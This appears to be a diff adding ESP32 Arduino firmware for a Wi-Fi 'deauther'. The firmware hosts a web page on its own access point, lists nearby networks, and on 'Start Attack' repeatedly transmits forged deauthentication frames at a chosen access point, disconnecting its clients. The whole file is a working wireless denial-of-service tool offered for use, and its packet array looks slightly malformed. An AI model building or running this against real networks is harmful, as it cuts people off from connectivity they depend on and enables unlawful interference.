@@ -1,0 +1,154 @@
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <WebServer.h>
+
+WebServer server(80);
+
+const char* ssid = "ESP32_Deauther";
+const char* password = "1";
+
+bool attackRunning = false;
+String targetBSSID = "";
+uint8_t bssid[6];
+
+unsigned long lastAttackTime = 0;
+const int attackInterval = 500;
+
+int apCount = 0;
+struct AP {
+  String ssid;
+  int32_t rssi;
+  uint8_t bssid[6];
+};
+AP apList[20];
+
+String toMAC(uint8_t* mac) {
+  char str[18];
+  sprintf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
+          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return String(str);
+}
+
+void sendDeauth(uint8_t* mac) {
+  uint8_t deauthPacket[26] = {
+    0xC0, 0x00, 0x3A, 0x01,
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    0x00, 0x00, 0x07, 0x00, 0x00, 0x00
+  };
+
+  for (int i = 0; i < 50; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(1);
+  }
+}
+
+void handleRoot() {
+  String statusColor = attackRunning ? "#FF0000" : "#00FF00";
+  String statusText = attackRunning ? "ACTIVE" : "INACTIVE";
+
+  String html = R"rawlit(
+    <html><head><title>ESP32 Deauther</title>
+    <style>
+    body {
+      background-color: #121212;
+      color: white;
+      font-family: Arial;
+      text-align: center;
+    }
+    .status {
+      border: 2px solid #555;
+      border-radius: 10px;
+      display: inline-block;
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 18px;
+      background-color: )rawlit" + statusColor + R"rawlit(;
+    }
+    button {
+      background-color: #1e1e1e;
+      color: red;
+      border: 2px solid red;
+      border-radius: 8px;
+      padding: 10px 30px;
+      margin: 10px;
+      font-size: 16px;
+    }
+    .ap-box {
+      border: 1px solid red;
+      border-radius: 10px;
+      margin: 10px auto;
+      padding: 10px;
+      width: 250px;
+    }
+    </style></head><body>
+    <h2>ESP32 WiFi Deauther</h2>
+    <div class='status'>Status: )rawlit" + statusText + R"rawlit(</div><br><br>
+    <form method='POST' action='/scan'><button>Scan Networks</button></form><br>
+  )rawlit";
+
+  for (int i = 0; i < apCount; i++) {
+    String mac = toMAC(apList[i].bssid);
+    html += "<div class='ap-box'>SSID: " + apList[i].ssid + "<br>BSSID: " + mac +
+            "<br><form method='POST' action='/start'>" +
+            "<input type='hidden' name='mac' value='" + mac + "'>" +
+            "<button>Start Attack</button></form></div>";
+  }
+
+  html += "<form method='POST' action='/stop'><button>Stop Attack</button></form>";
+  html += "</body></html>";
+
+  server.send(200, "text/html", html);
+}
+
+void handleScan() {
+  apCount = WiFi.scanNetworks(false, true);
+  for (int i = 0; i < apCount && i < 20; i++) {
+    apList[i].ssid = WiFi.SSID(i);
+    apList[i].rssi = WiFi.RSSI(i);
+    memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
+  }
+  server.sendHeader("Location", "/");
+  server.send(303);
+}
+
+void handleStart() {
+  if (server.hasArg("mac")) {
+    String macStr = server.arg("mac");
+    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+    attackRunning = true;
+  }
+  server.sendHeader("Location", "/");
+  server.send(303);
+}
+
+void handleStop() {
+  attackRunning = false;
+  server.sendHeader("Location", "/");
+  server.send(303);
+}
+
+void setup() {
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP(ssid, password);
+  delay(100);
+
+  server.on("/", handleRoot);
+  server.on("/scan", HTTP_POST, handleScan);
+  server.on("/start", HTTP_POST, handleStart);
+  server.on("/stop", HTTP_POST, handleStop);
+  server.begin();
+
+  esp_wifi_set_promiscuous(true);
+}
+
+void loop() {
+  server.handleClient();
+
+  if (attackRunning && millis() - lastAttackTime > attackInterval) {
+    sendDeauth(bssid);
+    lastAttackTime = millis();
+  }
+}
